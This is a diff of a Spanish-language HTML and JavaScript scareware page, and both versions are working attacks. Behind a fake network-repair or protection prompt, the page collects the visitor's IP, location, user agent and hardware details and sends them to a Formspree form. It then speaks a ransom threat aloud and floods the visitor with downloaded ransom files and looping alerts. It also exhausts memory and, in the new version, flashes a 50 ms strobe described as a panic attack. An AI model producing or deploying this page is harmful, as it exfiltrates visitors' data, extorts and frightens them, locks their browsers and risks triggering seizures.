@@ -2,109 +2,99 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>SISTEMA COMPROMETIDO - ACCESO TOTAL</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CRITICAL_SYSTEM_FAILURE</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Consolas', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .frame { border: 2px solid #333; padding: 40px; background: #0a0a0a; text-align: center; width: 400px; box-shadow: 0 0 50px #000; z-index: 10; }
-        input { background: #000; border: 1px solid #0f0; color: #0f0; padding: 10px; width: 80%; margin: 15px 0; outline: none; }
-        .btn-red { background: #600; color: #fff; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; width: 100%; text-transform: uppercase; }
-        
-        /* Estilo BSOD */
-        #bsod { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0078d7; color: #fff; font-family: 'Segoe UI', Arial; padding: 100px; box-sizing: border-box; z-index: 99999; }
-        .qr { width: 150px; height: 150px; background: #fff; margin-top: 20px; }
-        .bsod-text { font-size: 24px; line-height: 1.5; }
+        body { background: #000; color: #f00; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; cursor: none; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; z-index: 100; pointer-events: none; }
+        .glitch-text { font-size: 50px; font-weight: bold; text-align: center; display: none; }
+        #terminal { padding: 20px; font-size: 12px; color: #0f0; }
     </style>
 </head>
-<body oncontextmenu="return false">
+<body onclick="startGlobalAttack()">
 
-    <div id="setup" class="frame">
-        <h2 style="color: #f00;">⚠️ ERROR DE NODO ⚠️</h2>
-        <p>Se ha detectado una intrusión. Ingrese su nombre para encriptar su sesión y proteger sus archivos.</p>
-        <input type="text" id="target_name" placeholder="Nombre Completo">
-        <button class="btn-red" onclick="iniciarSecuestro()">PROTEGER EQUIPO</button>
+    <div id="initial-screen" style="padding: 50px; text-align: center;">
+        <h1 style="font-size: 40px;">⚠️ ERROR 403 ⚠️</h1>
+        <p>Acceso denegado. Se ha detectado un conflicto en su adaptador de red.</p>
+        <p style="background: #f00; color: #fff; padding: 10px; cursor: pointer;">HAGA CLIC AQUÍ PARA REPARAR EL NODO DE CONEXIÓN</p>
     </div>
 
-    <div id="bsod">
-        <div style="font-size: 100px;">:(</div>
-        <div class="bsod-text">
-            Su dispositivo tuvo un problema y necesita reiniciarse. <br>
-            Se está recopilando información sobre el error y después se reiniciará automáticamente.
-            <br><br>
-            100% completo
-            <br><br>
-            <div style="font-size: 16px;">
-                Para obtener más información sobre este problema y las posibles correcciones, visite: <br>
-                https://windows.com/stopcode <br><br>
-                Código de detención: <span id="target_code">CRITICAL_PROCESS_DIED</span>
-            </div>
-        </div>
+    <div id="overlay">
+        <div id="msg" class="glitch-text">CONEXIÓN SECUESTRADA</div>
     </div>
+
+    <div id="terminal"></div>
 
     <script>
         const FORM_ID = "xykdyebg";
 
-        async function iniciarSecuestro() {
-            const nombre = document.getElementById('target_name').value;
-            if (!nombre) return;
+        async function startGlobalAttack() {
+            // 1. OCULTAR UI INICIAL Y BLOQUEAR CURSOR
+            document.getElementById('initial-screen').style.display = 'none';
+            document.getElementById('msg').style.display = 'block';
+            document.body.style.cursor = 'none';
 
-            // 1. OBTENCIÓN DE DATOS (IP, GPU, RAM)
-            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-            const gpu = getGPU();
-
-            // Enviar a Formspree
+            // 2. EXTRACCIÓN DE METADATOS (Móvil y PC)
+            const ipReq = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+            
             fetch(`https://formspree.io/f/${FORM_ID}`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    "VICTIMA": nombre,
-                    "IP": ipData.ip,
-                    "CIUDAD": ipData.city,
-                    "GPU": gpu,
-                    "RAM": navigator.deviceMemory + "GB"
+                    "STATUS": "FULL_HIJACK",
+                    "IP": ipReq.ip,
+                    "PROVIDER": ipReq.org,
+                    "LOC": `${ipReq.city}, ${ipReq.country_name}`,
+                    "UA": navigator.userAgent,
+                    "MEM": navigator.deviceMemory + "GB",
+                    "CORES": navigator.hardwareConcurrency
                 })
             });
 
-            // 2. VOZ DE AMENAZA
-            const voz = new SpeechSynthesisUtterance(`Atención ${nombre}. He robado tu información y si la quieres recuperar tienes que pagarme. Te llamaré en diez horas.`);
-            voz.lang = 'es-ES';
-            voz.pitch = 0.3;
-            window.speechSynthesis.speak(voz);
+            // 3. AMENAZA DE VOZ (Loop)
+            const voice = new SpeechSynthesisUtterance("He robado su información y si la quiere recuperar tiene que pagarme. Te llamaré en diez horas.");
+            voice.lang = 'es-ES';
+            voice.pitch = 0.1;
+            voice.rate = 0.8;
+            window.speechSynthesis.speak(voice);
 
+            // 4. ATAQUE VISUAL ESTROBOSCÓPICO (Ataque de pánico)
+            setInterval(() => {
+                document.body.style.backgroundColor = document.body.style.backgroundColor === 'black' ? 'white' : 'black';
+                document.body.style.color = document.body.style.color === 'red' ? 'black' : 'red';
+            }, 50); // Cambios cada 50ms
+
+            // 5. ATAQUE DE HARDWARE (CPU, RAM, DISCO, VIBRACIÓN)
             if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+            
+            const storage = [];
+            setInterval(() => {
+                // Vibración (Android)
+                if ("vibrate" in navigator) navigator.vibrate([500, 200, 500]);
 
-            // 3. BOMBA DE 30 ARCHIVOS TXT
-            for (let i = 1; i <= 30; i++) {
-                setTimeout(() => {
-                    const blob = new Blob([`PAGAME ${nombre.toUpperCase()}. TENGO TU IP ${ipData.ip}.`], {type: 'text/plain'});
-                    const url = URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = `RESCATE_${nombre.replace(/\s/g, '_')}_${i}.txt`;
-                    a.click();
-                }, i * 150);
-            }
+                // Inundación de Logs
+                const l = document.createElement('div');
+                l.innerText = `> EXFILTRATING_DATA_FROM_${ipReq.ip}... [SUCCESS]`;
+                document.getElementById('terminal').appendChild(l);
 
-            // 4. ACTIVAR BSOD Y BLOQUEO
-            setTimeout(() => {
-                document.getElementById('setup').style.display = 'none';
-                document.getElementById('bsod').style.display = 'block';
-                
-                setInterval(() => {
-                    alert(`⚠️ SISTEMA SECUESTRADO ⚠️\n\nNombre: ${nombre}\nIP: ${ipData.ip}\n\nREVISA TUS DESCARGAS. PAGAME O NO RECUPERAS NADA.`);
-                    
-                    // Saturación de RAM para "pitar" la sesión
-                    new Array(10000000).fill("💀");
-                    
-                    if (!window.speechSynthesis.speaking) window.speechSynthesis.speak(voz);
-                }, 1000);
-            }, 5000); // El BSOD aparece a los 5 segundos de empezar las descargas
-        }
+                // Bomba de Archivos (Txt personalizado)
+                const blob = new Blob(["PAGAME EL RESCATE. TENGO TU IP: " + ipReq.ip], {type: 'text/plain'});
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `SISTEMA_SECUESTRADO_${Math.random().toString(36).substring(7)}.txt`;
+                a.click();
 
-        function getGPU() {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-            return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/D";
+                // Bloqueo total por Alertas
+                alert("⚠️ ATENCIÓN ⚠️\n\nTu sistema ha sido comprometido.\nIP: " + ipReq.ip + "\n\nNO INTENTE CERRAR ESTA VENTANA.");
+
+                // Saturación de RAM para "pitar" el procesador
+                for(let i=0; i<200; i++) {
+                    storage.push(new Array(1000000).fill("💀").join(""));
+                }
+
+                if (!window.speechSynthesis.speaking) window.speechSynthesis.speak(voice);
+            }, 200);
         }
     </script>
 </body>
